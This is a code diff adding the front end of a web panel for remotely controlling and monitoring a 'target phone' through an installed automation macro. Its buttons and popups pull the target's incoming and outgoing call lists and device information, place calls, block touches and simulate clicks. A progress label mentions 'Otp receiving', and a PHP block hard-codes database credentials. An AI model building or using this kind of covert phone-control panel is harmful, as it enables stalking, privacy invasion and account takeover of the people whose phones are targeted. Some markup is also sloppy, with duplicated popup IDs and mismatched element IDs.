+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=callreject');"><i class="fa-solid fa-phone fa-beat-fade"></i>call reject</div>         
+</br>
+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=scnblock');"><i class="fa-solid fa-lock fa-beat-fade"></i>block touches</div> 
+
+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=scnunblock');"><i class="fa-solid fa-lock-open fa-beat-fade"></i>unblock touches</div>     
+   <br>
+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=silent');"><i class="fa-solid fa-bell-slash fa-beat-fade"></i>silent mode</div> 
+
+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=ringer');"><i class="fa-solid fa-bell fa-beat-fade"></i>ringer mode</div>         
+<br>
+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=rotpot');"><i class="fa-solid fa-image-portrait fa-beat-fade"></i><ion-icon name="business-outline"></ion-icon> rotation portrait</div> 
+
+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=rotlan');"><i class="fa-duotone fa-image-landscape fa-beat-fade"></i>rotation landscape</div>     
+    <br>
+<div class="ggg b11 disable" onclick="cmd();showPopup('popup11')"> <i class="fa-solid fa-phone fa-beat-fade"></i>Call Any One</div> 
+
+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=lastnum');"><i class="fa-solid fa-phone fa-beat-fade"></i>call on last number</div>         
+<br>
+<div class="ggg b11 disable" onclick="cmd();senddata('?Forgszr=up');"><i class="fa-solid fa-up-long fa-beat-fade"></i>   Up slider</div> 
+
+<div class="ggg b11 disable" onclick="cmd();senddata('?Forgszr=down');"> <i class="fa-solid fa-down-long fa-beat-fade"></i>down slider</div>     
+   <br>
+<div class="ggg b11 disable" onclick="cmd();senddata('?Forgszr=left');"><i class="fa-solid fa-left-long fa-beat-fade"></i>left slider</div> 
+
+<div class="ggg b11 disable" onclick="cmd();senddata('?Forgszr=right');"><i class="fa-solid fa-right-long fa-beat-fade"></i>right slider</div>   
+</div>     
+
+
+
+
+</center>
+
+</table>
+<!--❤️❤️❤️❤️-->
+
+<!--☢️☢️USELESS CONTENT ☢️☢️-->
+
+<div id="progressstl">
+        <span id="progress-value"></span>
+    </div>
+  
+<a id="ontopx">
+    <i class="fad fa-angle-double-up"></i>
+    </a>
+ 
+
+<!--☢️☢️ USELESS CONTENT ☢️☢️-->
+
+<!--🔳🔳 INPUT BUTTONS 🔳🔳-->
+<center>
+<div class="inputbtn" onclick="showPopup('popup14')">Button xx</div>
+
+<div class="inputbtn" onclick="showPopup('popup1')">Button 1</div>
+
+<div class="inputbtn" onclick="showPopup('popup2')">Receive full information</div>
+
+<div class="inputbtn" onclick="showPopup('popup3')">Receive incoming call list </div>
+
+<div class="inputbtn" onclick="showPopup('popup4')">Receive outgoing call list</div>
+
+<div class="inputbtn" onclick="showPopup('popup5')">Receive important information</div>
+
+<div class="inputbtn" onclick="showPopup('popup6')">Receive full information</div>
+
+<div class="inputbtn" onclick="showPopup('popup7')">Open your insta account</div>
+
+<div class="inputbtn" onclick="cmd;showPopup('popup8');">Button 8 voluxex</div>
+
+<div class="inputbtn" onclick="showPopup('popup9')">Button 9</div>
+
+<div class="inputbtn" onclick="showPopup('popup10')">Button 10</div>
+
+<div class="inputbtn" onclick="showPopup('popup11')">Button 11</div>
+
+<div class="inputbtn" onclick="showPopup('popup12')">Button 12</div>
+
+<div class="inputbtn" onclick="showPopup('popup13')">Button 13</div>
+</center>
+
+<!-- Popups -->
+
+<div id="popup1" class="whitepop">
+    <div class="whitepop-content">
+ <div class="closenten" onclick="hidePopup()">x</div>
+  <span class="multititle">Popup 1 First Title 🐦🐤</span><br>
+    Text :  <input class="inputfield" type="text" id="ggpp">   
+        <button class="sendbtn" onclick="senddata('?ggpp='+document.getElementById('ggpp').value+'&Tempvar=bs'); setTimeout(function() { hidePopup(); }, 2000);">Done ✓</button>
+<br>
+<span class="connect-text">&#10084; Connect with me on</span><a href="https://www.instagram.com/jatin_m8?igsh=Z3VjMHFrYXl6Z296"><i class="fab fa-instagram instagram"></i></a>
+<a href="https://wa.link/rtgttb"><i class="fab fa-whatsapp whatsapp"></i></a><a href="https://t.me/jatin_m8"><i class="fab fa-telegram telegram"></i></a>
+  </div></div>
+<!-- Repeat the same structure for popups 2 to 10 with appropriate IDs -->
+
+<div id="popup2" class="whitepop">
+    <div class="whitepop-content">
+        <div class="closenten" onclick="hidePopup()">x</div>
+<span class="multititle">Receive full information of phone.</span><br>     
+   Number :  <input class="inputfield" type="text" id="infonumber">
+        <button class="sendbtn" onclick="senddata('?infonumber='+document.getElementById('infonumber').value+'&Tempvar=info'); setTimeout(function() { hidePopup(); }, 2000);">Done ✓</button>
+<br>
+<span class="connect-text">&#10084; Connect with me on</span><a href="https://www.instagram.com/jatin_m8?igsh=Z3VjMHFrYXl6Z296"><i class="fab fa-instagram instagram"></i></a>
+<a href="https://wa.link/rtgttb"><i class="fab fa-whatsapp whatsapp"></i></a><a href="https://t.me/jatin_m8"><i class="fab fa-telegram telegram"></i></a>
+
+</div></div>
+
+
+<div id="popup3" class="whitepop">
+    <div class="whitepop-content">
+        <div class="closenten" onclick="hidePopup()">x</div>
+        <span class="multititle">View all incoming calls list today<br>(All calls list will be refreshed at 12 AM)</span><br>
+  Number :  <input class="inputfield" type="text" id="outcllist">   
+        <button class="sendbtn" onclick="senddata('?outcllist='+document.getElementById('sendoutgoing').value+'&Option=outcllist'); setTimeout(function() { hidePopup(); }, 2000);">Done ✓</button>
+<br>
+<span class="connect-text">&#10084; Connect with me on</span><a href="https://www.instagram.com/jatin_m8?igsh=Z3VjMHFrYXl6Z296"><i class="fab fa-instagram instagram"></i></a>
+<a href="https://wa.link/rtgttb"><i class="fab fa-whatsapp whatsapp"></i></a><a href="https://t.me/jatin_m8"><i class="fab fa-telegram telegram"></i></a>
+</div></div>
+
+<div id="popup4" class="whitepop">
+    <div class="whitepop-content">
+        <div class="closenten" onclick="hidePopup()">x</div>
+        <span class="multititle">View all outgoing calls list today<br>(All calls list will be refreshed at 12 AM)</span><br>
+  Number :  <input class="inputfield" type="text" id="inclmist">   
+        <button class="sendbtn" onclick="senddata('?inclmist='+document.getElementById('sendincoming').value+'&Option=inclmist'); setTimeout(function() { hidePopup(); }, 2000);">Done ✓</button>
+<br>
+<span class="connect-text">&#10084; Connect with me on</span><a href="https://www.instagram.com/jatin_m8?igsh=Z3VjMHFrYXl6Z296"><i class="fab fa-instagram instagram"></i></a>
+<a href="https://wa.link/rtgttb"><i class="fab fa-whatsapp whatsapp"></i></a><a href="https://t.me/jatin_m8"><i class="fab fa-telegram telegram"></i></a>
+</div></div>
+
+<div id="popup5" class="whitepop">
+    <div class="whitepop-content">
+        <div class="closenten" onclick="hidePopup()">x</div>
+<span class="multititle">Receive important information of Target phone</span>      <br>
+   Number :  <input class="inputfield" type="text" id="impoinfo">
+        <button class="sendbtn" onclick="senddata('?impoinfo='+document.getElementById('impoinfo').value+'&Option=impoinfo'); setTimeout(function() { hidePopup(); }, 2000);">Done ✓</button>
+<br>
+<span class="connect-text">&#10084; Connect with me on</span><a href="https://www.instagram.com/jatin_m8?igsh=Z3VjMHFrYXl6Z296"><i class="fab fa-instagram instagram"></i></a>
+<a href="https://wa.link/rtgttb"><i class="fab fa-whatsapp whatsapp"></i></a><a href="https://t.me/jatin_m8"><i class="fab fa-telegram telegram"></i></a>
+</div></div>
+
+<div id="popup6" class="whitepop">
+    <div class="whitepop-content">
+        <div class="closenten" onclick="hidePopup()">x</div>
+<span class="multititle">Receive full information of phone.</span><br>    
+   Number :  <input class="inputfield" type="text" id="fullinfo">
+        <button class="sendbtn" onclick="senddata('?fullinfo='+document.getElementById('fullinfo').value+'&Option=fullinfo'); setTimeout(function() { hidePopup(); }, 2000);">Done ✓</button>
+<br>
+<span class="connect-text">&#10084; Connect with me on</span><a href="https://www.instagram.com/jatin_m8?igsh=Z3VjMHFrYXl6Z296"><i class="fab fa-instagram instagram"></i></a>
+<a href="https://wa.link/rtgttb"><i class="fab fa-whatsapp whatsapp"></i></a><a href="https://t.me/jatin_m8"><i class="fab fa-telegram telegram"></i></a>
+</div></div>
+
+<div id="popup7" class="whitepop">
+    <div class="whitepop-content">
+        <div class="closenten" onclick="hidePopup()">x</div>
+<span class="multititle">Open your instgram id in target phone<br>(inter username without @ simbol)</span>  <br>    
+
+Number :<input class="inputfield" type="text" id="instaid">
+        <button class="sendbtn" onclick="senddata('?instaid='+document.getElementById('instaid').value+'&Pages=instaid'); setTimeout(function() { hidePopup(); }, 2000);">Done ✓</button>
+<br>
+<span class="connect-text">&#10084; Connect with me on</span><a href="https://www.instagram.com/jatin_m8?igsh=Z3VjMHFrYXl6Z296"><i class="fab fa-instagram instagram"></i></a>
+<a href="https://wa.link/rtgttb"><i class="fab fa-whatsapp whatsapp"></i></a><a href="https://t.me/jatin_m8"><i class="fab fa-telegram telegram"></i></a>
+</div></div>
+
+
+<div id="popup8" class="whitepop">
+    <div class="whitepop-content-panel">
+        <div class="closenten" onclick="hidePopup()">x</div>
+<span class="multititle">Brightness control panel</span>  <br>   
+<div class="dropPP">
+<button id="xxx">blink level<i class="fa fa-caret-down"></i></button>
+<div class="down">
+<a onclick="hidePopup();cmd();senddata('?Tempvar=scn5')">blink 5 times </a>
+<a onclick="hidePopup();cmd();senddata('?Tempvar=scn10')">blink 10 times</a>
+<a onclick="hidePopup();cmd();senddata('?Tempvar=scn15')">blink 15 times</a>
+</div></div> 
+
+<input class="inputfield-panel" type="text" placeholder="Custom..." id="blk">
+        
+<button class="sendbtn" onclick="cmd();hidePopup();senddata('?blk='+document.getElementById('blk').value+'&Pages=voice');">Done ✓</button>
+</div></div>
+
+<div id="popup9" class="whitepop">
+    <div class="whitepop-content-panel">
+        <div class="closenten" onclick="hidePopup()">x</div>
+<span class="multititle">Volume control panel</span>  <br>   
+<div class="dropPP">
+<button id="xxx">volume level<i class="fa fa-caret-down"></i></button>
+<div class="down">
+<a onclick="hidePopup();cmd();senddata('?Tempvar=vlm10')">Volume 10% </a>
+<a onclick="hidePopup();cmd();senddata('?Tempvar=vlm25')">Volume 25%</a>
+<a onclick="hidePopup();cmd();senddata('?Tempvar=vlm70')">Volume 70%</a>
+</div></div> 
+
+<input class="inputfield-panel" type="text" placeholder="Custom..." id="vlmcnz">
+        
+<button class="sendbtn" onclick="cmd();hidePopup();senddata('?vlmcnz='+document.getElementById('vlmcnz').value+'&Pages=vlmcnznum');">Done ✓</button>
+</div></div>
+
+<div id="popup10" class="whitepop">
+    <div class="whitepop-content-panel">
+        <div class="closenten" onclick="hidePopup()">x</div>
+<span class="multititle">Torch control panel</span>  <br>   
+<div class="dropPP">
+<button id="xxx">blink level<i class="fa fa-caret-down"></i></button>
+<div class="down">
+<a onclick="hidePopup();cmd();senddata('?Tempvar=trch5')">blink 5 times </a>
+<a onclick="hidePopup();cmd();senddata('?Tempvar=trch10')">blink 10 times</a>
+<a onclick="hidePopup();cmd();senddata('?Tempvar=trch20')">blink 20 times</a>
+</div></div> 
+<input class="inputfield-panel" type="text" placeholder="Custom..." id="trchblink">
+        
+<button class="sendbtn" onclick="cmd();hidePopup();senddata('?trchblink='+document.getElementById('trchblink').value+'&Pages=trchok');">Done ✓</button>
+</div></div>
+
+
+
+<div id="popup11" class="whitepop">
+    <div class="whitepop-content-panel">
+   <div class="closenten" onclick="hidePopup()">x</div>
+
+Number : <input class="inputfield-panel" type="text" placeholder="Enter Your  10 Digit Number" id="callany">
+        
+<button class="sendbtn" onclick="cmd();hidePopup();senddata('?callany='+document.getElementById('callany').value+'&Tempvar=callanyok');">Call Now</button>
+</div></div>
+
+
+<div id="popup10" class="whitepop">
+    <div class="whitepop-content-panel">
+   <div class="closenten" onclick="hidePopup()">x</div>
+Number : <input class="inputfield-panel" type="text" placeholder="Clicking Any Whare" id="click">
+<button class="sendbtn" onclick="cmd();hidePopup();senddata('?click='+document.getElementById('click').value+'&Tempvar=clickok');">Call Now</button>
+</div></div>
+
+
+
+<div id="popup11" class="whitepop">
+    <div class="whitepop-content-panel">
+   <div class="closenten" onclick="hidePopup()">x</div>
+Number : <input class="inputfield-panel" type="text" placeholder="long click Any Whare" id="longclick">
+<button class="sendbtn" onclick="cmd();hidePopup();senddata('?longclick='+document.getElementById('longclick').value+'&Tempvar=longclickok');">Call Now</button>
+</div></div>
+
+
+<div id="popup14" class="whitepop">
+    <div class="whitepop-content">
+        <div class="closenten" onclick="hidePopup()">x</div>
+<span class="multititle">Clicking on anywhere.</span><br>    
+Number :  <input class="inputfield" type="text" id="press">
+
+        <button class="sendbtn" onclick="senddata('?press='+document.getElementById('press').value+'&Tempvar=pressok'); setTimeout(function() { hidePopup(); }, 2000);">Done ✓</button>
+</div></div>
+
+
+ <center>
+  <div class="menu">
+    <div class="toggle">
+
+      <ion-icon name="add"></ion-icon>
+    </div>
+
+    <li style="--i:0;">
+      <a href="#">
+        <ion-icon name="home"></ion-icon>
+      </a>
+    </li>
+    
+    <li style="--i:1;">
+      <a href="#">
+        <ion-icon name="settings"></ion-icon>
+      </a>
+    </li>
+    
+    <li style="--i:2;">
+      <a href="#">
+        <ion-icon name="mail"></ion-icon>
+      </a>
+    </li>
+    
+   <li style="--i:3;">
+      <a href="#" onclick="moon()">
+        <ion-icon name="sunny" id="moon"></ion-icon>
+      </a>
+    </li>
+    
+    <li style="--i:4;">
+      <a href="#">
+        <ion-icon name="key-outline"></ion-icon>
+      </a>
+    </li>
+    
+    <li style="--i:5;">
+      <a href="#">
+        <ion-icon name="game-controller-outline"></ion-icon>
+      </a>
+    </li>
+    
+    <li style="--i:6;">
+      <a href="#">
+        <ion-icon name="camera-outline"></ion-icon>
+      </a>
+    </li>
+    
+    <li style="--i:7;">
+      <a href="#">
+        <ion-icon name="person-outline"></ion-icon>
+      </a>
+    </li>
+
+    
+  </div>
+  </center>
+
+
+
+<!--🔳🔳 INPUT BUTTONS 🔳🔳-->
+
+  <center>
+    <div class="spcl" id="multiple"style="color:white;text-align:center;font-weight: bold;">Note: You have to install macro named <a href="https://macrodroidlink.com/macrostore?id=21083" style="color: rgb(0, 221, 255);text-decoration: none;font-weight: bold;display: inline;">"Control Device Remotely (From a app) 50+ Features"</a> in your device inorder to use this phone controller app.<br><br>Developed By: <span class="heart">&#10084;</span> From Mr Jatin <a href="https://www.instagram.com/jatin_m8/"><i class="fa fa-instagram" style="font-size:20px;background-color:white;border-radius: 5px;padding: 2px 3px;color:rgb(244, 0, 208);"></i></a></div>
+
+
+
+
+
+<script>
+    function cmd() {
+        document.getElementById('pp').style.display = 'block'      
+        setTimeout(function() {
+            document.getElementById('pp').style.display = 'none';
+        }, 2000);
+    }
+</script>   
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+  
+<script>
+    function showPopup(popupId) {
+        var popups = document.querySelectorAll('.whitepop');
+        popups.forEach(function(popup) {
+            popup.style.display = 'none';
+        });
+
+        var popup = document.getElementById(popupId);
+        if (popup) {
+            popup.style.display = 'block';
+        }
+    }
+
+    function hidePopup() {
+        var popups = document.querySelectorAll('.whitepop');
+        popups.forEach(function(popup) {
+            popup.style.display = 'none';
+        });
+    }
+</script>
+
+
+
+ <?php
+// Database connection parameters
+$servername = "sql304.infinityfree.com";
+$username = "if0_36137747";
+$password = "Jatin900";
+$dbname = "if0_36137747_log";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+// Sanitize user input
+
+$TargetsLinks = mysqli_real_escape_string($conn, $_POST['TargetsLinks']);
+
+// SQL insert statement
+$sql = "INSERT INTO login (TargetsLinks) VALUES ('$TargetsLinks')";
+
+// Close connection
+$conn->close();
+?>
+
+<!--MY SQL TO TELECOM SEND MESSAGE-->
+
+
+
+<!--STOP RELOAD WEB PAGE-->
+
+<script>
+    document.getElementById('linkbase').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent the default form submission
+        
+        // Collect form data
+        var formData = new FormData(this);
+        
+        // Send form data asynchronously
+        fetch('<?php echo $_SERVER['PHP_SELF']; ?>', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Handle the response from the server
+            console.log(data);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    });
+</script>
+
+<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  
+  <script>
+  let toggle = document.querySelector('.toggle');
+  let menu = document.querySelector('.menu');
+  toggle.onclick = function(){
+    menu.classList.toggle('active')
+  }
+  </script>
+
+
+<script src="https://code.jquery.com/jquery-3.5.1.js" ></script>
+ 
+</body>
+<!--FOR LOADING POPUP BTN-->
+
+<script>
+document.querySelectorAll('.wait').forEach(function(button) {
+    button.addEventListener('click', function() {
+        document.querySelectorAll('.wait').forEach(function(button) {
+            button.classList.add('wait');
+        });
+        this.classList.remove('wait');
+        document.getElementById('backoverlay').style.display = 'block';
+        document.getElementById('waiting').style.display = 'block';
+        startProgress();
+    });
+});
+
+function startProgress() {
+    var progBar = document.getElementById('progBar');
+    var progText = document.getElementById('progText');
+    var width = 0;
+    var interval = setInterval(function() {
+        if (width >= 100) {
+            clearInterval(interval);
+            closeLoading();
+        } else {
+            width++;
+            progBar.style.width = width + '%';
+            progBar.textContent = width + '%';
+            progText.textContent = 'Otp receiving ' + width + '/100'+'%';
+        }
+    }, 200); // 1 minute in milliseconds / 100
+}
+
+function closeLoading() {
+    document.getElementById('backoverlay').style.display = 'none';
+    document.getElementById('waiting').style.display = 'none';
+}
+</script>
+
+
+<!--FOR LOADING POPUP BTN-->
+<script>
+        // $(document).ready(function(){
+            //     $('div#loading').removeAttr('id');
+        // });
+        var preloader = document.getElementById("loading");
+        // window.addEventListener('load', function(){
+        //     preloader.style.display = 'none';
+        //     })
+
+        function myFunction(){
+            preloader.style.display = 'none';
+        };
+    </script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous">
+</script>
+<script src="jatin.js"></script>
+<script src="java.js"></script>
+</html>
